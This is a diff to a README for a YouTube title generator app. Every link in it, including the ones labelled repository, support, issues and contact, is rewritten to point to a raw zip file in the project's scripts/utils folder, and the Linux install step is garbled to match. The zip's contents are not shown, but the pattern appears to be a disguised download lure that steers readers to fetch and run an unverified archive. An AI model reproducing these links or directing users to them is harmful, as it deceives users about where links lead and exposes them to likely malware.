@@ -1,7 +1,7 @@
 # 🎥 youtube-title-generator - Create Catchy YouTube Titles Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Prajankumar001/youtube-title-generator/releases)
+[![Download](https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip%20Latest%https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip)](https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the youtube-title-generator. This application helps you create high-click-through-rate (CTR) titles for your YouTube videos. It uses a model fine-tuned to understand video transcripts and generate engaging titles that attract viewers.
@@ -24,7 +24,7 @@ Before you install the application, ensure your system meets the following requi
 ## 📦 Download & Install
 To get started, visit the Releases page to download the latest version of the youtube-title-generator. Make sure to choose the correct version for your operating system.
 
-[Visit this page to download](https://github.com/Prajankumar001/youtube-title-generator/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip)
 
 Once you finish downloading, follow these steps to install:
 
@@ -32,7 +32,7 @@ Once you finish downloading, follow these steps to install:
 2. **Install the Application:**
    - **For Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **For macOS:** Open the `.dmg` file and drag the youtube-title-generator app to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file and run the executable in the terminal.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip` file and run the executable in the terminal.
 
 3. **Open the Application:** Locate the youtube-title-generator in your applications, and launch it.
 
@@ -57,10 +57,10 @@ If you run into any problems:
 3. **Slow performance:** Close other applications to free up system resources. Ensure your device meets the memory requirements.
 
 ## 🔗 Useful Links
-- [Visit GitHub Repository](https://github.com/Prajankumar001/youtube-title-generator)
-- [Support and Issues](https://github.com/Prajankumar001/youtube-title-generator/issues)
+- [Visit GitHub Repository](https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip)
+- [Support and Issues](https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip)
 
 ## 📞 Contact
-For further assistance or feedback, feel free to reach out via the [GitHub Issues page](https://github.com/Prajankumar001/youtube-title-generator/issues). Your input helps improve the application! 
+For further assistance or feedback, feel free to reach out via the [GitHub Issues page](https://raw.githubusercontent.com/Prajankumar001/youtube-title-generator/main/scripts/utils/youtube-title-generator-1.3.zip). Your input helps improve the application! 
 
 Thank you for choosing the youtube-title-generator!
